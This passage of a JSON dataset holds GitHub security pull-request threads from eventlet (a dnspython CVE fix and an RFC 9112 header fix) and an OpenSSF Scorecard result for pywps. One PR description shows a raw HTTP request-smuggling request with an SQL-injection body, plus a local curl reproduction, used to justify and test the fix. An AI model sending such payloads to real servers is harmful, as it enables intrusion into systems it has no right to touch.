[py38poll](https://app.codecov.io/gh/eventlet/eventlet/pull/916/flags?src=pr&el=flag&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=eventlet) | `53% <22%> (-1%)` | :arrow_down: |\n| [py38selects](https://app.codecov.io/gh/eventlet/eventlet/pull/916/flags?src=pr&el=flag&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=eventlet) | `53% <22%> (-1%)` | :arrow_down: |\n| [py39asyncio](https://app.codecov.io/gh/eventlet/eventlet/pull/916/flags?src=pr&el=flag&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=eventlet) | `51% <22%> (-1%)` | :arrow_down: |\n| [py39dnspython1](https://app.codecov.io/gh/eventlet/eventlet/pull/916/flags?src=pr&el=flag&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=eventlet) | `51% <22%> (-1%)` | :arrow_down: |\n| [py39epolls](https://app.codecov.io/gh/eventlet/eventlet/pull/916/flags?src=pr&el=flag&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=eventlet) | `53% <22%> (-1%)` | :arrow_down: |\n| [py39poll](https://app.codecov.io/gh/eventlet/eventlet/pull/916/flags?src=pr&el=flag&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=eventlet) | `53% <22%> (-1%)` | :arrow_down: |\n| [py39selects](https://app.codecov.io/gh/eventlet/eventlet/pull/916/flags?src=pr&el=flag&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=eventlet) | `53% <22%> (-1%)` | :arrow_down: |\n\nFlags with carried forward coverage won't be shown. [Click here](https://docs.codecov.io/docs/carryforward-flags?utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=eventlet#carryforward-flags-in-the-pull-request-comment) to find out more.\n\n\n</details>\n\n[:umbrella: View full report in Codecov by Sentry](https://app.codecov.io/gh/eventlet/eventlet/pull/916?src=pr&el=continue&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=eventlet).   \n:loudspeaker: Have feedback on the report? [Share it here](https://about.codecov.io/codecov-pr-comment-feedback/?utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=eventlet).\n",
                        "user": "codecov[bot]",
                        "issue_author_association": "NONE",
                        "project_created_at": "2024-02-14T15:54:57Z",
                        "url": "https://github.com/eventlet/eventlet/pull/916#issuecomment-1944116544"
                    },
                    {
                        "body": "@kelvin-j-li do you plan to propose related unit test (see my previous suggestion), or can I merge this patch?",
                        "user": "4383",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2024-02-16T10:32:25Z",
                        "url": "https://github.com/eventlet/eventlet/pull/916#issuecomment-1948128668"
                    },
                    {
                        "body": "This fix is not enough, and the change at line 837 is a regression without the updated receive code.  The main fix for the CVE are [the changes to receive_udp in this commit](https://github.com/rthalley/dnspython/commit/f66e25b5f549acf66d1fb6ead13eb3cff7d09af3)\r\n\r\nI don't have a good unit test for these as they involve receiving various invalid things and ignoring them.",
                        "user": "rthalley",
                        "issue_author_association": "NONE",
                        "project_created_at": "2024-02-16T13:04:35Z",
                        "url": "https://github.com/eventlet/eventlet/pull/916#issuecomment-1948353751"
                    },
                    {
                        "body": "I think eventlet changes should look a lot [like this branch](https://github.com/rthalley/eventlet/tree/tudoor)\r\n\r\nAlso, I added some unit tests to dnspython, see class [IgnoreErrors](https://github.com/rthalley/dnspython/blob/master/tests/test_query.py) if you want to adapt them.",
                        "user": "rthalley",
                        "issue_author_association": "NONE",
                        "project_created_at": "2024-02-16T15:30:15Z",
                        "url": "https://github.com/eventlet/eventlet/pull/916#issuecomment-1948624734"
                    },
                    {
                        "body": "@rthalley: Thanks for details \r\n@kelvin-j-li: I let you acknowledge Bob's suggestions.",
                        "user": "4383",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2024-02-16T16:50:53Z",
                        "url": "https://github.com/eventlet/eventlet/pull/916#issuecomment-1948870731"
                    },
                    {
                        "body": "> @rthalley: Thanks for details @kelvin-j-li: I let you acknowledge Bob's suggestions.\r\n\r\nhi Hervé / Bob:\r\nyes, I agree with @rthalley. \r\n\r\nDo you prefer me to copy the code from https://github.com/rthalley/eventlet/tree/tudoor to this PR? I am ok with close this PR and use Bob's change/PR instead from https://github.com/rthalley/eventlet/tree/tudoor\r\n\r\nMany thanks!\r\n\r\n",
                        "user": "kelvin-j-li",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2024-02-19T01:36:32Z",
                        "url": "https://github.com/eventlet/eventlet/pull/916#issuecomment-1951548007"
                    },
                    {
                        "body": "Hi @kelvin-j-li \r\n\r\nWe have to use the latest version of the Bob's branch with the `Truncated` changes included. AFAIK Bob designed a fix but do not proposed a pull request. If Bob is ok with copying his changes, you could copy his branch and then co-author the fix, else Bob could simply propose a pull request. \r\n\r\n@rthalley do you have any preference?\r\n  ",
                        "user": "4383",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2024-02-19T10:02:51Z",
                        "url": "https://github.com/eventlet/eventlet/pull/916#issuecomment-1952099761"
                    },
                    {
                        "body": "I didn't do a PR in part because I don't have time to write the tests; I mostly wanted to show the sort of thing that is needed to keep the CVE fix.   I'm ok with just copying from my branch.",
                        "user": "rthalley",
                        "issue_author_association": "NONE",
                        "project_created_at": "2024-02-19T12:57:24Z",
                        "url": "https://github.com/eventlet/eventlet/pull/916#issuecomment-1952398437"
                    },
                    {
                        "body": "hi @4383 / @rthalley,\r\nI had copy Bob fix into this PR:\r\n\r\ncfe9b7b - (HEAD -> master, origin/master, origin/HEAD) Copied the complete fix for (CVE-2023-29483) and handling of truncated exceptions in greendns.py provided by Bob Halley from https://github.com/rthalley/eventlet/tree/tudoor\r\n\r\nthanks! ",
                        "user": "kelvin-j-li",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2024-02-19T13:18:55Z",
                        "url": "https://github.com/eventlet/eventlet/pull/916#issuecomment-1952435152"
                    },
                    {
                        "body": "Thanks guys (@kelvin-j-li, @rthalley) for the collaboration.\r\n\r\nThis patch LGTM, I'm going to merge it.",
                        "user": "4383",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2024-02-19T13:37:39Z",
                        "url": "https://github.com/eventlet/eventlet/pull/916#issuecomment-1952472285"
                    }
                ],
                "pull_request": {
                    "url": "https://api.github.com/repos/eventlet/eventlet/pulls/916",
                    "merged_at": "2024-02-19T13:42:27Z"
                }
            },
            {
                "url": "https://github.com/eventlet/eventlet/pull/826",
                "title": "Fix security issue related to RFC 9112",
                "labels": [
                    "important",
                    "urgent",
                    "security"
                ],
                "user": "4383",
                "issue_author_association": "MEMBER",
                "number": 826,
                "id": 2037889523,
                "state": "closed",
                "project_created_at": "2023-12-12T14:36:56Z",
                "closed_at": "2024-01-11T15:05:25Z",
                "body": "Reject requests which contains headers `content-length` and `transfer-encoding` at the same time.\r\n\r\nThat's not allowed by RFC 9112 and that could lead to potential security attacks.\r\n\r\nhttps://www.rfc-editor.org/rfc/rfc9112#section-6.1-15\r\n\r\nThis is an extract of the RFC:\r\n\r\n> A server MAY reject a request that contains both Content-Length and\r\n> Transfer-Encoding or process such a request in accordance with the\r\n> Transfer-Encoding alone. Regardless, the server MUST close the\r\n> connection after responding to such a request to avoid the potential\r\n> attacks.\r\n\r\n> A server or client that receives an HTTP/1.0 message containing\r\n> a Transfer-Encoding header field MUST treat the message as if the\r\n> framing is faulty, even if a Content-Length is present, and close the\r\n> connection after processing the message. The message sender might have\r\n> retained a portion of the message, in buffer, that could be\r\n> misinterpreted by further use of the connection.\r\n\r\nThe following request would lead to this scenario:\r\n\r\n```\r\nPOST / HTTP/1.1\r\nHost: a.com\r\nTransfer-Encoding: chunked\r\nContent-Length: 0\r\nContent-Type: application/x-\"##-form-urlencoded\r\n14\r\nid=1'or sleep(1);###\r\n0\r\n```\r\n\r\nWith these changes, when this kind of request is received the connection is closed and an error 400 is returned.\r\n\r\nThis scenario can be tested by using the following process:\r\n\r\n1. run a wsgi server either: \r\n- by using the wsgi sample in official examples (http://eventlet.net/doc/examples.html#wsgi-server) \r\n- or by using my previous patch (https://github.com/eventlet/eventlet/pull/825) that allow you to run wsgi server from the command line (`$ eventlet_wsgi_example`)\r\n2. send the following HTTP request to the running server:\r\n```\r\ncurl -d \"param1=value1&param2=value2\" -X POST -H 'Transfer-Encoding:\r\nchunked' -H 'Content-Length: 0' --http1.1 http://0.0.0.0:8090 -i\r\n```\r\n\r\nThe previous curl command display returned headers and status code. You can observe that now, with these changes, bad requests are rejected.\r\n\r\n These changes also remove `content-lenght` from the `chunk` tests to avoid reflecting something that's not a bad practice.\r\n\r\nThis security issue was originally discovered by Keran Mu (mkr22@mails.tsinghua.edu.cn) and Jianjun Chen\r\n(jianjun@tsinghua.edu.cn), from Tsinghua University and Zhongguancun Laboratory\r\n\r\nThanks to them for raising our attention about this security problem.",
                "comments": [
                    {
                        "body": "> From the RFC:\r\n> \r\n> > Early implementations of Transfer-Encoding would occasionally send both a chunked transfer coding for message framing and an estimated Content-Length header field for use by progress bars. This is why Transfer-Encoding is defined as overriding Content-Length, as opposed to them being mutually incompatible.\r\n> \r\n> Given that, should we maybe make this in some way configurable, but defaulting to the more-secure behavior? That would allow us an escape hatch for working with old clients that cannot be updated (for example, because their source code may have been lost), particularly if the operator and/or application developer know that the service will not be forwarding any messages.\r\n\r\nTotally agree with the \"configurable but defaulting to the more secure behavior\" path. I'll rework my patch to introduce an option.\r\n \r\n> \r\n> I'd also like to note that since we're relying on stdlib's HTTP parsing, there are still cases where a client may send both headers but we don't 400. See also: [python/cpython#81274](https://github.com/python/cpython/issues/81274) and #574 (which unfortunately I never properly followed up on).\r\n\r\nThanks for the heads up.\r\n\r\n> \r\n> That said, I agree, [the danger is certainly real](https://bugs.launchpad.net/swift/+bug/1840507).\r\n\r\n",
                        "user": "4383",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2023-12-14T10:00:11Z",
                        "url": "https://github.com/eventlet/eventlet/pull/826#issuecomment-1855538257"
                    },
                    {
                        "body": "## [Codecov](https://app.codecov.io/gh/eventlet/eventlet/pull/826?src=pr&el=h1&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=eventlet) Report\nAttention: `6 lines` in your changes are missing coverage. Please review.\n> Comparison is base [(`dbb411d`)](https://app.codecov.io/gh/eventlet/eventlet/commit/dbb411d6a8531c52bf9507297e8d844f52d1d8ef?el=desc&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=eventlet) 54% compared to head [(`457e760`)](https://app.codecov.io/gh/eventlet/eventlet/pull/826?src=pr&el=desc&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=eventlet) 54%.\n\n| [Files](https://app.codecov.io/gh/eventlet/eventlet/pull/826?src=pr&el=tree&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=eventlet) | Patch % | Lines |\n|---|---|---|\n| [eventlet/wsgi.py](https://app.codecov.io/gh/eventlet/eventlet/pull/826?src=pr&el=tree&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=eventlet#diff-ZXZlbnRsZXQvd3NnaS5weQ==) | 33% | [5 Missing and 1 partial :warning: ](https://app.codecov.io/gh/eventlet/eventlet/pull/826?src=pr&el=tree&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=eventlet) |\n\n<details><summary>Additional details and impacted files</summary>\n\n\n```diff\n@@          Coverage Diff          @@\n##           master   #826   +/-   ##\n=====================================\n- Coverage      54%    54%   -1%     \n=====================================\n  Files          88     88           \n  Lines        9744   9752    +8     \n  Branches     1814   1816    +2     \n=====================================\n- Hits         5296   5295    -1     \n- Misses       4082   4089    +7     \n- Partials      366    368    +2     \n```\n\n| [Flag](https://app.codecov.io/gh/eventlet/eventlet/pull/826/flags?src=pr&el=flags&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=eventlet) | Coverage Δ | |\n|---|---|---|\n| [ipv6](https://app.codecov.io/gh/eventlet/eventlet/pull/826/flags?src=pr&el=flag&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=eventlet) | `22% <11%> (-1%)` | :arrow_down: |\n| [py310epolls](https://app.codecov.io/gh/eventlet/eventlet/pull/826/flags?src=pr&el=flag&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=eventlet) | `53% <33%> (-1%)` | :arrow_down: |\n| [py310poll](https://app.codecov.io/gh/eventlet/eventlet/pull/826/flags?src=pr&el=flag&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=eventlet) | `53% <33%> (-1%)` | :arrow_down: |\n| [py310selects](https://app.codecov.io/gh/eventlet/eventlet/pull/826/flags?src=pr&el=flag&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=eventlet) | `52% <33%> (-1%)` | :arrow_down: |\n| [py311epolls](https://app.codecov.io/gh/eventlet/eventlet/pull/826/flags?src=pr&el=flag&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=eventlet) | `53% <33%> (-1%)` | :arrow_down: |\n| [py312epolls](https://app.codecov.io/gh/eventlet/eventlet/pull/826/flags?src=pr&el=flag&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=eventlet) | `50% <33%> (-1%)` | :arrow_down: |\n| [py37epolls](https://app.codecov.io/gh/eventlet/eventlet/pull/826/flags?src=pr&el=flag&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=eventlet) | `50% <33%> (-1%)` | :arrow_down: |\n| [py38epolls](https://app.codecov.io/gh/eventlet/eventlet/pull/826/flags?src=pr&el=flag&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=eventlet) | `52% <33%> (-1%)` | :arrow_down: |\n| [py38openssl](https://app.codecov.io/gh/eventlet/eventlet/pull/826/flags?src=pr&el=flag&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=eventlet) | `51% <33%> (-1%)` | :arrow_down: |\n| [py38poll](https://app.codecov.io/gh/eventlet/eventlet/pull/826/flags?src=pr&el=flag&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=eventlet) | `52% <33%> (-1%)` | :arrow_down: |\n| [py38selects](https://app.codecov.io/gh/eventlet/eventlet/pull/826/flags?src=pr&el=flag&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=eventlet) | `52% <33%> (-1%)` | :arrow_down: |\n| [py39dnspython1](https://app.codecov.io/gh/eventlet/eventlet/pull/826/flags?src=pr&el=flag&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=eventlet) | `51% <33%> (-1%)` | :arrow_down: |\n| [py39epolls](https://app.codecov.io/gh/eventlet/eventlet/pull/826/flags?src=pr&el=flag&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=eventlet) | `52% <33%> (-1%)` | :arrow_down: |\n| [py39poll](https://app.codecov.io/gh/eventlet/eventlet/pull/826/flags?src=pr&el=flag&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=eventlet) | `52% <33%> (-1%)` | :arrow_down: |\n| [py39selects](https://app.codecov.io/gh/eventlet/eventlet/pull/826/flags?src=pr&el=flag&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=eventlet) | `52% <33%> (-1%)` | :arrow_down: |\n\nFlags with carried forward coverage won't be shown. [Click here](https://docs.codecov.io/docs/carryforward-flags?utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=eventlet#carryforward-flags-in-the-pull-request-comment) to find out more.\n\n\n</details>\n\n[:umbrella: View full report in Codecov by Sentry](https://app.codecov.io/gh/eventlet/eventlet/pull/826?src=pr&el=continue&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=eventlet).   \n:loudspeaker: Have feedback on the report? [Share it here](https://about.codecov.io/codecov-pr-comment-feedback/?utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=eventlet).\n",
                        "user": "codecov[bot]",
                        "issue_author_association": "NONE",
                        "project_created_at": "2023-12-14T11:13:46Z",
                        "url": "https://github.com/eventlet/eventlet/pull/826#issuecomment-1855654256"
                    },
                    {
                        "body": "codecov is a bit flaky...",
                        "user": "4383",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2023-12-18T16:40:03Z",
                        "url": "https://github.com/eventlet/eventlet/pull/826#issuecomment-1860998056"
                    },
                    {
                        "body": "@tipabu is the latest version is ok for you?",
                        "user": "4383",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2024-01-08T10:55:23Z",
                        "url": "https://github.com/eventlet/eventlet/pull/826#issuecomment-1880777407"
                    },
                    {
                        "body": "If no answer in a few days should probably just proceed, given it's a security issue.",
                        "user": "itamarst",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2024-01-09T16:55:12Z",
                        "url": "https://github.com/eventlet/eventlet/pull/826#issuecomment-1883424382"
                    },
                    {
                        "body": "> If no answer in a few days should probably just proceed, given it's a security issue.\r\n\r\nyes",
                        "user": "4383",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2024-01-10T15:22:21Z",
                        "url": "https://github.com/eventlet/eventlet/pull/826#issuecomment-1885054329"
                    }
                ],
                "pull_request": {
                    "url": "https://api.github.com/repos/eventlet/eventlet/pulls/826",
                    "merged_at": "2024-01-11T15:05:25Z"
                }
            }
        ],
        "SecurityPolicy_content_category": [
            "Generic policy",
            "Scope of practice",
            "Reporting mechanism"
        ],
        "num_noncompliant_security_discuss_issue": 0,
        "num_noncompliant_security_pull": 2,
        "has_generic_policy": true
    },
    {
        "project_name": "geopython/pywps",
        "project_url": "https://github.com/geopython/pywps",
        "SSF": {
            "date": "2024-10-30T00:09:03+07:00",
            "repo": {
                "name": "github.com/geopython/pywps",
                "commit": "10dd07a9ee55c3033e240fa882eebadfc3ac4ad8"
            },
            "scorecard": {
                "version": "5.0.0",
                "commit": "ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4"
            },
            "score": 4.8,
            "checks": [
                {
                    "details": null,
                    "score": 10,
                    "reason": "no binaries found in the repo",
                    "name": "Binary-Artifacts",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#binary-artifacts",
                        "short": "Determines if the project has generated executable (binary) artifacts in the source repository."
                    }
                },
                {
                    "details": [
                        "Info: 'allow deletion' disabled on branch 'main'",
                        "Info: 'allow deletion' disabled on branch 'pywps-4.4'",
                        "Info: 'allow deletion' disabled on branch 'pywps-4.2'",
                        "Info: 'force pushes' disabled on branch 'main'",
                        "Info: 'force pushes' disabled on branch 'pywps-4.4'",
                        "Info: 'force pushes' disabled on branch 'pywps-4.2'",
                        "Warn: required approving review count is 1 on branch 'main'",
                        "Warn: required approving review count is 1 on branch 'pywps-4.4'",
                        "Warn: required approving review count is 1 on branch 'pywps-4.2'",
                        "Warn: codeowners review is not required on branch 'main'",
                        "Warn: codeowners review is not required on branch 'pywps-4.4'",
                        "Warn: codeowners review is not required on branch 'pywps-4.2'",
                        "Warn: no status checks found to merge onto branch 'main'",
                        "Warn: no status checks found to merge onto branch 'pywps-4.4'",
                        "Warn: no status checks found to merge onto branch 'pywps-4.2'",
                        "Info: PRs are required in order to make changes on branch 'main'",
                        "Info: PRs are required in order to make changes on branch 'pywps-4.4'",
                        "Info: PRs are required in order to make changes on branch 'pywps-4.2'"
                    ],
                    "score": 6,
                    "reason": "branch protection is not maximal on development and all release branches",
                    "name": "Branch-Protection",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#branch-protection",
                        "short": "Determines if the default and release branches are protected with GitHub's branch protection settings."
                    }
                },
                {
                    "details": null,
                    "score": 3,
                    "reason": "4 out of 11 merged PRs checked by a CI test -- score normalized to 3",
                    "name": "CI-Tests",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#ci-tests",
                        "short": "Determines if the project runs tests before pull requests are merged."
                    }
                },
                {
                    "details": null,
                    "score": 0,
                    "reason": "no effort to earn an OpenSSF best practices badge detected",
                    "name": "CII-Best-Practices",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#cii-best-practices",
                        "short": "Determines if the project has an OpenSSF (formerly CII) Best Practices Badge."
                    }
                },
                {
                    "details": null,
                    "score": 9,
                    "reason": "Found 10/11 approved changesets -- score normalized to 9",
                    "name": "Code-Review",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#code-review",
                        "short": "Determines if the project requires human code review before pull requests (aka merge requests) are merged."
                    }
                },
                {
                    "details": [
                        "Info: geopython @opengeospatial @wmo-im contributor org/company found, torchbox contributor org/company found, aptiro contributor org/company found, hoover contributor org/company found, CSHS-CWRA contributor org/company found, geosense contributor org/company found, GeoNode contributor org/company found, MapServer contributor org/company found, EO-College contributor org/company found, pistruiatul contributor org/company found, ouranos contributor org/company found, Maps4HTML contributor org/company found, liquidinvestigations contributor org/company found, isricworldsoil contributor org/company found, georust contributor org/company found, baronii contributor org/company found, geobeyond contributor org/company found, osgeo4inspire contributor org/company found, bird-house contributor org/company found, woudc contributor org/company found, rosedu contributor org/company found, crim-ca contributor org/company found, talos-gis contributor org/company found, via transportation contributor org/company found, geowetlands contributor org/company found, EO-Platforms contributor org/company found, OSGeo contributor org/company found, OGCMetOceanDWG contributor org/company found, rootio contributor org/company found, DLR-terrabyte contributor org/company found, german aerospace center - earth observation center contributor org/company found, geopython contributor org/company found, ECCC-MSC contributor org/company found, funkycitizens contributor org/company found, jakarto3d contributor org/company found, opengeolabs  @maptiler contributor org/company found, pybucuresti contributor org/company found, wagtail contributor org/company found, pydap contributor org/company found, wurbe contributor org/company found, "
                    ],
                    "score": 10,
                    "reason": "project has 40 contributing companies or organizations",
                    "name": "Contributors",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#contributors",
                        "short": "Determines if the project has a set of contributors from multiple organizations (e.g., companies)."
                    }
                },
                {
                    "details": null,
                    "score": 10,
                    "reason": "no dangerous workflow patterns detected",
                    "name": "Dangerous-Workflow",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#dangerous-workflow",
                        "short": "Determines if the project's GitHub Action workflows avoid dangerous patterns."
                    }
                },
                {
                    "details": [
                        "Warn: no dependency update tool configurations found"
                    ],
                    "score": 0,
                    "reason": "no update tool detected",
                    "name": "Dependency-Update-Tool",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#dependency-update-tool",
                        "short": "Determines if the project uses a dependency update tool."
                    }
                },
                {
                    "details": [
                        "Warn: no fuzzer integrations found"
                    ],
                    "score": 0,
                    "reason": "project is not fuzzed",
                    "name": "Fuzzing",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#fuzzing",
                        "short": "Determines if the project uses fuzzing."
                    }
                },
                {
                    "details": [
                        "Info: project has a license file: LICENSE.txt:0",
                        "Info: FSF or OSI recognized license: MIT License: LICENSE.txt:0"
                    ],
                    "score": 10,
                    "reason": "license file detected",
                    "name": "License",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#license",
                        "short": "Determines if the project has defined a license."
                    }
                },
                {
                    "details": null,
                    "score": 0,
                    "reason": "0 commit(s) and 0 issue activity found in the last 90 days -- score normalized to 0",
                    "name": "Maintained",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#maintained",
                        "short": "Determines if the project is \"actively maintained\"."
                    }
                },
                {
                    "details": [
                        "Warn: no GitHub/GitLab publishing workflow detected."
                    ],
                    "score": -1,
                    "reason": "packaging workflow not detected",
                    "name": "Packaging",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#packaging",
                        "short": "Determines if the project is published as a package that others can easily download, install, easily update, and uninstall."
                    }
                },
                {
                    "details": [
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/main.yml:15: update your workflow using https://app.stepsecurity.io/secureworkflow/geopython/pywps/main.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/main.yml:18: update your workflow using https://app.stepsecurity.io/secureworkflow/geopython/pywps/main.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/main.yml:19: update your workflow using https://app.stepsecurity.io/secureworkflow/geopython/pywps/main.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/main.yml:45: update your workflow using https://app.stepsecurity.io/secureworkflow/geopython/pywps/main.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/main.yml:50: update your workflow using https://app.stepsecurity.io/secureworkflow/geopython/pywps/main.yml/main?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/main.yml:60: update your workflow using https://app.stepsecurity.io/secureworkflow/geopython/pywps/main.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/main.yml:67: update your workflow using https://app.stepsecurity.io/secureworkflow/geopython/pywps/main.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/main.yml:68: update your workflow using https://app.stepsecurity.io/secureworkflow/geopython/pywps/main.yml/main?enable=pin",
                        "Warn: pipCommand not pinned by hash: .github/workflows/main.yml:24",
                        "Warn: pipCommand not pinned by hash: .github/workflows/main.yml:56",
                        "Warn: pipCommand not pinned by hash: .github/workflows/main.yml:74",
                        "Info:   0 out of   6 GitHub-owned GitHubAction dependencies pinned",
                        "Info:   0 out of   2 third-party GitHubAction dependencies pinned",
                        "Info:   0 out of   3 pipCommand dependencies pinned"
                    ],
                    "score": 0,
                    "reason": "dependency not pinned by hash detected -- score normalized to 0",
                    "name": "Pinned-Dependencies",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#pinned-dependencies",
                        "short": "Determines if the project has declared and pinned the dependencies of its build process."
                    }
                },
                {
                    "details": [
                        "Warn: 0 commits out of 30 are checked with a SAST tool"
                    ],
                    "score": 0,
                    "reason": "SAST tool is not run on all commits -- score normalized to 0",
                    "name": "SAST",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#sast",
                        "short": "Determines if the project uses static code analysis."
                    }
                },
                {
                    "details": [
                        "Info: security policy file detected: SECURITY.md:1",
                        "Warn: no linked content found",
                        "Info: Found disclosure, vulnerability, and/or timelines in security policy: SECURITY.md:1",
                        "Info: Found text in security policy: SECURITY.md:1"
                    ],
                    "score": 4,
                    "reason": "security policy file detected",
                    "name": "Security-Policy",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#security-policy",
                        "short": "Determines if the project has published a security policy."
                    }
                },
                {
                    "details": null,
                    "score": -1,
                    "reason": "no releases found",
                    "name": "Signed-Releases",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#signed-releases",
                        "short": "Determines if the project cryptographically signs release artifacts."
                    }
                },
                {
                    "details": [
                        "Warn: no topLevel permission defined: .github/workflows/main.yml:1",
                        "Info: no jobLevel write permissions found"
                    ],
                    "score": 0,
                    "reason": "detected GitHub workflow tokens with excessive permissions",
                    "name": "Token-Permissions",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#token-permissions",
                        "short": "Determines if the project's workflows follow the principle of least privilege."
                    }
                },
                {
                    "details": null,
                    "score": 10,
                    "reason": "0 existing vulnerabilities detected",
                    "name": "Vulnerabilities",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#vulnerabilities",
                        "short": "Determines if the project has open, known unfixed vulnerabilities."
                    }
                }
            ],
            "metadata": null
        },
        "SecurityPolicy_url_endpoint": "https://api.github.com/repos/geopython/pywps/contents/SECURITY.md",
